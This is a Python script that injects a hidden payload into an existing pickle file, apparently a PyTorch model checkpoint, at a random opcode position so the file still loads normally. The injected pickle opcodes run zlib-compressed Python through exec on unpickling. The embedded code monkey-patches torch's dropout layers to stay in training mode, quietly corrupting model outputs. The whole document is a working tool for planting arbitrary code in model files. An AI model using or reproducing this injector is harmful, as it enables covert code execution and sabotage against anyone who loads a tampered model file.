import sys
import pickletools
import tempfile
import os
import random
import zlib
import struct

# Open the files
inf, outf, pos = None, None, None
try:
    inf = open(sys.argv[1],'rb')
    outf = open(sys.argv[2],'wb')
except Exception as e:
    print(e)
    print('{} inputFile outputFile'.format(sys.argv[0]))
    exit()

# create the payload, the shellcode resolves to this.
# zlib decompress the blob and python exec it.
# the proto at the beginning and end change it to two, and back to what it was
# that just ensures consistancy in case other versions make this less effective.
# 94250272: \x80                                             PROTO      2
# 94250274: c                                                GLOBAL     '__builtin__ exec'
# 94250292: (                                                MARK
# 94250293: c                                                    GLOBAL     'zlib decompress'
# 94250310: (                                                    MARK
# 94250311: B                                                        BINBYTES   b'x\xda\xac...\x80\x12'
# 94282393: t                                                        TUPLE      (MARK at 94250310)
# 94282394: R                                                    REDUCE
# 94282395: t                                                    TUPLE      (MARK at 94250292)
# 94282396: R                                                REDUCE
# 94282397: 0                                                POP
# 94282398: \x80                                             PROTO      4
code = b'def _train_(self, mode=True):\n    torch.nn.Module.train(self, True)\n\ntorch.nn._DropoutNd.train = _train_'
data = zlib.compress(code,level=9)
payload = bytearray(b'\x80\x02c__builtin__\nexec\n(czlib\ndecompress\n(B'+struct.pack("<I",len(data))+data+b'tRtR0\x80')

# dissasemble the target pickle and get potential locations
temp = tempfile.TemporaryFile("w+")
locations = []
while inf.tell() != os.fstat(inf.fileno()).st_size:
    try:
        pickletools.dis(inf, temp)
        temp.seek(0)
        version = int(temp.read().partition('highest protocol among opcodes = ')[2].partition('\n')[0])
        temp.seek(0)
        tempLocations = [location.partition(":")[0] for location in temp.read().split('\n')]
        for location in tempLocations:
            try:
                locations.append((int(location),version))
            except ValueError as e:
                pass
    except Exception as e:
        print(e)
        break

# pick a random opcode and inject our shellcode before it.
# since pickle opcodes are location independent and our shellcode cleans up the stack, we can inject anywhere and it shouldn't affect a thing.
pos, version = random.choice(locations)
    
# append the version so that it is set at the end. the shell code doesn't define what it's being set back to until this point.
payload.append(version)


# simply write the target to the output file up to the injection location, write the shellcode to the output, and then write everything left in the target to the output.
inf.seek(0)
print("injecting at",pos)
outf.write(inf.read(pos))
outf.write(payload)
outf.write(inf.read())
